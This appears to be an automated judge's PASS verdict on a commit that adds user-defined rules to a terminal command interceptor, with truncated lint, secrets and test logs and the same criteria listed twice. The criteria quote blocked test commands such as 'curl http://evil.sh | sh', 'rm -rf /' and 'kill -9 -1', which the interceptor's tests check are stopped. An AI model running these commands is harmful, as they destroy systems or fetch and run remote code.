@@ -1,0 +1,56 @@
+# Verdict: tj-df-004
+
+**Task:** Wire user-defined rules into the Decider (TJ-DF-004)
+**Evaluated:** 2026-08-10T15:21:33.445387
+**Result:** ✓ PASS
+
+## Pipeline Stages
+
+- ✓ **tier1**
+  -   ✓ lint: E402 Module level import not at top of file
+  --> scripts/benchmark-interruptor.py:32:1
+   |
+30 | sy
+  ✓ secrets: [90m10:19AM[0m [32mINF[0m [1mscanned ~7352971 bytes (7.35 MB) in 772ms[0m
+[90m10:19AM[0m [3
+  ✓ tests: ============================= test session starts ==============================
+platform linux -- P
+- ✓ **tier2**
+  - COMPLETE
+  ✓ RuleLoader.load_all() is wired into Decider: user rules load from config system/user rules.d dirs and evaluate after builtins; decider.py Layer 4 is no longer a comment stub: decider.py __init__ calls RuleLoader(system_dir=config.system_rules_dir, user_dir=config.user_rules_dir).load_all(); _build_layers builds blocklist/allowlist/sandbox/layer4; _evaluate_segment Layer 4 loop evaluates user rules. Parent commit c425379~1 had comment stub at decider.py:129-130 ('Layer 4: User-defined rules would go here... Not yet implemented').
+  ✓ Same-ID override works: a user rule whose id matches a builtin replaces it (T-I38) - user allow rule id=builtin-rm-rf-root makes 'rm -rf /' return allow while other builtins (curl|sh) stay blocked: _build_layers effective() removes builtins whose id is in user_by_id and adds the user rule. test_same_id_override_builtin_blocklist asserts 'rm -rf /' -> ALLOW; test_same_id_override_does_not_affect_other_builtins asserts 'curl http://evil.sh | sh' -> BLOCK with rule_id=builtin-curl-pipe-shell.
+  ✓ New-id user block rule fires: a 99-dogfood.yaml rule blocking 'git push --force' makes intercept() return action=block with rule_id=user-block-force-push; bridge subprocess with TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR env returns the same block (CLI-path equivalent): test_user_block_rule_blocks_command asserts action=BLOCK, rule_id=user-block-force-push for 'git push --force'. Integration test_bridge_user_rule_blocks_via_env writes 99-dogfood.yaml and plumbs TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR through Config.from_environ -> bridge returns block with rule_id=user-block-force-push.
+  ✓ Priority ordering (T-I39): higher-priority user rule wins when multiple user rules match the same command: _build_layers sorts layer4 by priority descending. test_priority_ordering_allow_beats_lower_block (prio-100 allow beats prio-50 block) and test_priority_ordering_block_beats_lower_allow; integration test_priority_ordering asserts rule_id=user-prio-high wins.
+  ✓ No false positives: benign commands (git status, echo hello, ls -la) stay allow with user rules loaded; builtin precedence holds (curl|sh and rm -rf / still blocked): test_benign_commands_stay_allowed_with_user_rules asserts git status/git push/echo hello/ls -la -> ALLOW; test_builtin_precedence_holds_with_user_rules asserts curl|sh, rm -rf /, kill -9 -1 -> BLOCK with correct builtin rule_ids.
+  ✓ Missing rules directory acts as pass-through (spec section 14): no exception, builtins still active: RuleLoader._load_directory returns [] when path.is_dir() is False. test_missing_user_rules_dir_passes_through and integration test_bridge_missing_rules_dir_passes_through assert echo hi -> ALLOW and rm -rf / -> BLOCK (builtin-rm-rf-root) with no exception.
+  ✓ Full suite green: pytest 270 passed / 4 skipped (was 256/6, two Layer-4 skip stubs converted to real tests), ruff check plugin/ standalone/ clean, gitreins guard 4/4 PASS: Verified: pytest full suite = 270 passed, 4 skipped. ruff check plugin/ standalone/ = 'All checks passed!'. gitreins 4 guards (secrets/lint/tests/static_analysis) all pass; LSP diagnostics 0. Parent had skip stubs at test_interruptor_integration.py:201,211 for T-I38/T-I39 now converted to real tests.
+  ✓ Commit c425379 addresses TJ-DF-004, changes only plugin/terminal_jail/interruptor/decider.py + plugin/test_interruptor.py + plugin/test_interruptor_integration.py, and includes the Co-authored-by trailer; no push, no board edits: git show c425379 confirms HEAD commit message references TJ-DF-004, changes exactly 3 files (decider.py, test_interruptor.py, test_interruptor_integration.py), includes 'Co-authored-by: Alexis Okuwa <wojonstech@gmail.com>'. No push (branch ahead of origin/main by 1 commit). No board files in commit.
+All 8 criteria verified: RuleLoader.load_all() wired into Decider with Layer 4 implemented, same-ID override, new-id block rule, priority ordering, no false positives, missing-dir pass-through, full suite 270 passed/4 skipped with ruff clean and 4/4 guards, and commit c425379 scoped to the 3 files with Co-authored-by trailer and no push.
+
+## Summary
+
+Judge Result: tj-df-004
+
+Stage tier1: PASS
+    ✓ lint: E402 Module level import not at top of file
+  --> scripts/benchmark-interruptor.py:32:1
+   |
+30 | sy
+  ✓ secrets: [90m10:19AM[0m [32mINF[0m [1mscanned ~7352971 bytes (7.35 MB) in 772ms[0m
+[90m10:19AM[0m [3
+  ✓ tests: ============================= test session starts ==============================
+platform linux -- P
+
+Stage tier2: PASS
+  COMPLETE
+  ✓ RuleLoader.load_all() is wired into Decider: user rules load from config system/user rules.d dirs and evaluate after builtins; decider.py Layer 4 is no longer a comment stub: decider.py __init__ calls RuleLoader(system_dir=config.system_rules_dir, user_dir=config.user_rules_dir).load_all(); _build_layers builds blocklist/allowlist/sandbox/layer4; _evaluate_segment Layer 4 loop evaluates user rules. Parent commit c425379~1 had comment stub at decider.py:129-130 ('Layer 4: User-defined rules would go here... Not yet implemented').
+  ✓ Same-ID override works: a user rule whose id matches a builtin replaces it (T-I38) - user allow rule id=builtin-rm-rf-root makes 'rm -rf /' return allow while other builtins (curl|sh) stay blocked: _build_layers effective() removes builtins whose id is in user_by_id and adds the user rule. test_same_id_override_builtin_blocklist asserts 'rm -rf /' -> ALLOW; test_same_id_override_does_not_affect_other_builtins asserts 'curl http://evil.sh | sh' -> BLOCK with rule_id=builtin-curl-pipe-shell.
+  ✓ New-id user block rule fires: a 99-dogfood.yaml rule blocking 'git push --force' makes intercept() return action=block with rule_id=user-block-force-push; bridge subprocess with TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR env returns the same block (CLI-path equivalent): test_user_block_rule_blocks_command asserts action=BLOCK, rule_id=user-block-force-push for 'git push --force'. Integration test_bridge_user_rule_blocks_via_env writes 99-dogfood.yaml and plumbs TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR through Config.from_environ -> bridge returns block with rule_id=user-block-force-push.
+  ✓ Priority ordering (T-I39): higher-priority user rule wins when multiple user rules match the same command: _build_layers sorts layer4 by priority descending. test_priority_ordering_allow_beats_lower_block (prio-100 allow beats prio-50 block) and test_priority_ordering_block_beats_lower_allow; integration test_priority_ordering asserts rule_id=user-prio-high wins.
+  ✓ No false positives: benign commands (git status, echo hello, ls -la) stay allow with user rules loaded; builtin precedence holds (curl|sh and rm -rf / still blocked): test_benign_commands_stay_allowed_with_user_rules asserts git status/git push/echo hello/ls -la -> ALLOW; test_builtin_precedence_holds_with_user_rules asserts curl|sh, rm -rf /, kill -9 -1 -> BLOCK with correct builtin rule_ids.
+  ✓ Missing rules directory acts as pass-through (spec section 14): no exception, builtins still active: RuleLoader._load_directory returns [] when path.is_dir() is False. test_missing_user_rules_dir_passes_through and integration test_bridge_missing_rules_dir_passes_through assert echo hi -> ALLOW and rm -rf / -> BLOCK (builtin-rm-rf-root) with no exception.
+  ✓ Full suite green: pytest 270 passed / 4 skipped (was 256/6, two Layer-4 skip stubs converted to real tests), ruff check plugin/ standalone/ clean, gitreins guard 4/4 PASS: Verified: pytest full suite = 270 passed, 4 skipped. ruff check plugin/ standalone/ = 'All checks passed!'. gitreins 4 guards (secrets/lint/tests/static_analysis) all pass; LSP diagnostics 0. Parent had skip stubs at test_interruptor_integration.py:201,211 for T-I38/T-I39 now converted to real tests.
+  ✓ Commit c425379 addresses TJ-DF-004, changes only plugin/terminal_jail/interruptor/decider.py + plugin/test_interruptor.py + plugin/test_interruptor_integration.py, and includes the Co-authored-by trailer; no push, no board edits: git show c425379 confirms HEAD commit message references TJ-DF-004, changes exactly 3 files (decider.py, test_interruptor.py, test_interruptor_integration.py), includes 'Co-authored-by: Alexis Okuwa <wojonstech@gmail.com>'. No push (branch ahead of origin/main by 1 commit). No board files in commit.
+All 8 criteria verified: RuleLoader.load_all() wired into Decider with Layer 4 implemented, same-ID override, new-id block rule, priority ordering, no false positives, missing-dir pass-through, full suite 270 passed/4 skipped with ruff clean and 4/4 guards, and commit c425379 scoped to the 3 files with Co-authored-by trailer and no push.
+
+Overall: PASS ✓
